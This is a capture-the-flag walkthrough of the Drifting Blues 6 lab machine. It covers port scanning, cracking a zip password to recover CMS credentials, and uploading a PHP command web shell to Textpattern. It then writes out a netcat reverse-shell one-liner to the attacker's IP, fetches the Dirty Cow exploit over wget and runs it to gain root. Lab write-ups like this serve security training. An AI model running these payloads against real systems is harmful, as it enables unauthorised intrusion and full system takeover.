---
layout: default
title: Drifting Blues 6
parent: Proving Grounds Play
nav_order: 16
---

# Scanning

---

```bash
┌──(vagrant㉿kali)-[~/Documents/PG/PLAY/driftingblues]
└─$ sudo nmap -Pn -p- -sC -sV -T4 --open 192.168.160.219
Starting Nmap 7.94 ( https://nmap.org ) at 2023-11-10 10:28 EST
Nmap scan report for 192.168.160.219
Host is up (0.11s latency).
Not shown: 65534 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.2.22 ((Debian))
|_http-title: driftingblues
| http-robots.txt: 1 disallowed entry
|_/textpattern/textpattern
|_http-server-header: Apache/2.2.22 (Debian)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 28.33 seconds

```

# Enumeration

---

## HTTP | 80

![index](../../../assets/images/ctfs/proving_grounds/driftingblues6/index.png)

![bottom](../../../assets/images/ctfs/proving_grounds/driftingblues6/bottom.png)

![robots](../../../assets/images/ctfs/proving_grounds/driftingblues6/robots.png)

![textpattern](../../../assets/images/ctfs/proving_grounds/driftingblues6/textpattern.png)

## WFUZZ/Gobuster

Uncovers _/spammer.zip_

Download and unzip looking for password for _creds.txt_

```bash
┌──(vagrant㉿kali)-[~/Documents/PG/PLAY/driftingblues]
└─$ unzip spammer.zip
Archive:  spammer.zip
[spammer.zip] creds.txt password:

```

Crack with John

```bash
┌──(vagrant㉿kali)-[~/Documents/PG/PLAY/driftingblues]
└─$ zip2john spammer.zip > spam.hash
ver 2.0 spammer.zip/creds.txt PKZIP Encr: cmplen=27, decmplen=15, crc=B003611D ts=ADCB cs=b003 type=0

┌──(vagrant㉿kali)-[~/Documents/PG/PLAY/driftingblues]
└─$ john --wordlist=/usr/share/wordlists/rockyou.txt spam.hash
Using default input encoding: UTF-8
Loaded 1 password hash (PKZIP [32/64])
Will run 3 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
myspace4         (spammer.zip/creds.txt)
1g 0:00:00:00 DONE (2023-11-10 10:39) 16.66g/s 307200p/s 307200c/s 307200C/s havana..tanika
Use the "--show" option to display all of the cracked passwords reliably
Session completed.

```

Get creds from _spammer.zip_

```bash
┌──(vagrant㉿kali)-[~/Documents/PG/PLAY/driftingblues]
└─$ unzip spammer.zip
Archive:  spammer.zip
[spammer.zip] creds.txt password:
 extracting: creds.txt

┌──(vagrant㉿kali)-[~/Documents/PG/PLAY/driftingblues]
└─$ ls
creds.txt  spam.hash  spammer.zip

┌──(vagrant㉿kali)-[~/Documents/PG/PLAY/driftingblues]
└─$ cat creds.txt
mayer:lionheart

```

We now have some credentials to use somewhere...mayer:lionheart
{: .warn }

We are able to authenticate to _/textpattern/textpattern_

![logon](../../../assets/images/ctfs/proving_grounds/driftingblues6/logon.png)

# Exploitation

---

We have the ability to upload files in our authenticated section.

Reviewing _searchsploit_ for exploits on _Textpatter 4.8_ we have the following options:

```bash
# Exploit Title : TextPattern CMS 4.8.7 - Remote Command Execution (Authenticated)
# Date : 2021/09/06
# Exploit Author : Mert Da<C5><9F> merterpreter@gmail.com
# Software Link : https://textpattern.com/file_download/113/textpattern-4.8.7.zip
# Software web : https://textpattern.com/
# Tested on: Server : Xampp

First of all we should use file upload section to upload our shell.
Our shell contains this malicious code: <?PHP system($_GET['cmd']);?>

1) Go to content section .
2) Click Files and upload malicious php file.
3) go to yourserver/textpattern/files/yourphp.php?cmd=yourcode;

After upload our file , our request and respons is like below :

```

Create PHP CMD shell.

```bash
┌──(vagrant㉿kali)-[~/Documents/PG/PLAY/driftingblues]
└─$ vim cmd.php

┌──(vagrant㉿kali)-[~/Documents/PG/PLAY/driftingblues]
└─$ cat cmd.php
<?php

system($_GET['cmd'])

?>

```

Upload to the target.

![upload](../../../assets/images/ctfs/proving_grounds/driftingblues6/upload.png)

Run a test command and verify RCE.

![cmd](../../../assets/images/ctfs/proving_grounds/driftingblues6/cmd.png)

Use _revshellgen_ to generate a bash one-liner on our netcat listener.

```bash
┌──(vagrant㉿kali)-[~/Documents/PG/PLAY/driftingblues]
└─$ revshellgen -i 192.168.45.217 -p 9001 -t nc-mknod

[+] Reverse shell command:

rm /tmp/l;mknod /tmp/l p;/bin/sh 0</tmp/l | nc 192.168.45.217 9001 1>/tmp/l

┌──(vagrant㉿kali)-[~/Documents/PG/PLAY/driftingblues]
└─$ urlencode "rm /tmp/l;mknod /tmp/l p;/bin/sh 0</tmp/l | nc 192.168.45.217 9001 1>/tmp/l"
rm%20%2Ftmp%2Fl%3Bmknod%20%2Ftmp%2Fl%20p%3B%2Fbin%2Fsh%200%3C%2Ftmp%2Fl%20%7C%20nc%20192.168.45.217%209001%201%3E%2Ftmp%2Fl

# Execute the following URL

URL: http://192.168.160.219/textpattern/files/cmd.php?cmd=rm%20%2Ftmp%2Fl%3Bmknod%20%2Ftmp%2Fl%20p%3B%2Fbin%2Fsh%200%3C%2Ftmp%2Fl%20%7C%20nc%20192.168.45.217%209001%201%3E%2Ftmp%2Fl

# Get a reverse shell

┌──(vagrant㉿kali)-[~/Documents/PG/PLAY/driftingblues]
└─$ nc -nlvp 9001
listening on [any] 9001 ...
connect to [192.168.45.217] from (UNKNOWN) [192.168.160.219] 33206
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)

```

# Post-Exploitation

---

After chekcing for common privesc exploits, the prove to be vulnerable to Dirty Cow.

## Check OS Version

```bash
www-data@driftingblues:/etc$ uname -a
Linux driftingblues 3.2.0-4-amd64 #1 SMP Debian 3.2.78-1 x86_64 GNU/Linux

```

3.2.0-4 is susceptible to the Dirty Cow kernel exploit.

[rverton cowroot.c github raw code](https://gist.githubusercontent.com/rverton/e9d4ff65d703a9084e85fa9df083c679/raw/9b1b5053e72a58b40b28d6799cf7979c53480715/cowroot.c)

```bash
www-data@driftingblues:/tmp$ wget http://192.168.45.217:8000/cowroot.c
--2023-11-10 13:30:30--  http://192.168.45.217:8000/cowroot.c
Connecting to 192.168.45.217:8000... connected.
HTTP request sent, awaiting response... 200 OK
Length: 4688 (4.6K) [text/x-csrc]
Saving to: `cowroot.c'

100%[==============================================================>] 4,688       --.-K/s   in 0s

2023-11-10 13:30:30 (9.28 MB/s) - `cowroot.c' saved [4688/4688]

# Compile the exploit locally on target
www-data@driftingblues:/tmp$ gcc cowroot.c -o cowroot -pthread

# Run exploit
www-data@driftingblues:/tmp$ ./cowroot
DirtyCow root privilege escalation
Backing up /usr/bin/passwd to /tmp/bak
Size of binary: 51096
Racing, this may take a while..
thread stopped
thread stopped
/usr/bin/passwd overwritten
Popping root shell.
Don't forget to restore /tmp/bak
root@driftingblues:/tmp# whoami
root
```

We have a root shell as a result of the Dirty Cow kernel exploit.
